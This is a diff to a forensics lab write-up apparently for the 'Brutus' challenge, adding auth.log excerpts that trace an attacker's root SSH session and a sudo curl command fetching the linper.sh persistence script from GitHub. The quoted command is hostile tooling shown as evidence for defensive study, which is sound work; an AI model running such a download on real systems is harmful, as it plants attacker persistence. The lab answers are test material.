@@ -86,8 +86,12 @@ Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): passwo
 >
 >**Ans.** T11.36.001
 
-![[images/Pasted image 20250416154727.png]]
-
+![[images/Pasted image 20250420173405.png]]
+```
+Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
+Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
+```
 >[!Question 7]
 >**What time did the attacker's first SSH session end according to auth.log?**
 >
@@ -95,6 +99,10 @@ Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): passwo
 
 
 ![[images/Pasted image 20250416154930.png]]
+```
+voldemort@IdeaPad:~/Downloads/Brutus$ grep 'http' auth.log 
+Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+```
 >[!Question 8]
 >**The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**
 >
